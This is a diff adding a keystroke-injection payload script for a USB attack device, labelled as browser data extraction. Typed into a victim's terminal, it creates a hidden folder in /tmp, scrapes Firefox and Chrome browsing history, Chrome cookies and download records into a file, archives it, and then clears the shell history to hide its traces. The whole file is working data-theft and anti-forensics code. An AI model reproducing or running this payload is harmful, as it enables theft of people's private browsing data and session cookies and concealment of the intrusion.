@@ -1,0 +1,72 @@
+# ============================================
+# BROWSER EXTRACT - Browser Data Extraction
+# ============================================
+# Purpose: Extract browser history, cookies, passwords
+# Author: D3n14l0f53rv1c3
+# Original: https://github.com/i-am-shodan/USBArmyKnife
+# ============================================
+
+DELAY 1000
+
+# Open terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+# Create browser directory
+STRING mkdir -p /tmp/.cache/.br && cd /tmp/.cache/.br
+ENTER
+DELAY 300
+
+# Firefox extraction
+STRING echo "=== FIREFOX ===" > browser.txt
+ENTER
+DELAY 100
+STRING for db in ~/.mozilla/firefox/*/places.sqlite; do
+ENTER
+DELAY 100
+STRING   strings "$db" | grep -E "^http" | head -100 >> browser.txt
+ENTER
+DELAY 100
+STRING done
+ENTER
+DELAY 500
+
+# Chrome/Chromium extraction
+STRING echo "=== CHROME ===" >> browser.txt
+ENTER
+DELAY 100
+STRING strings ~/.config/google-chrome/Default/History 2>/dev/null | grep -E "^http" | head -100 >> browser.txt
+ENTER
+DELAY 500
+
+# Cookie extraction
+STRING echo "=== COOKIES ===" >> browser.txt
+ENTER
+DELAY 100
+STRING strings ~/.config/google-chrome/Default/Cookies 2>/dev/null | head -50 >> browser.txt
+ENTER
+DELAY 300
+
+# Download history
+STRING echo "=== DOWNLOADS ===" >> browser.txt
+ENTER
+DELAY 100
+STRING strings ~/.config/google-chrome/Default/History 2>/dev/null | grep -E "\.(exe|zip|pdf|doc)" | head -50 >> browser.txt
+ENTER
+DELAY 300
+
+# Pack results
+STRING tar czf browser_$(date +%s).tar.gz browser.txt
+ENTER
+DELAY 300
+
+STRING history -c
+ENTER
+STRING clear
+ENTER
+
+STRING echo "Browser extraction complete"
+ENTER
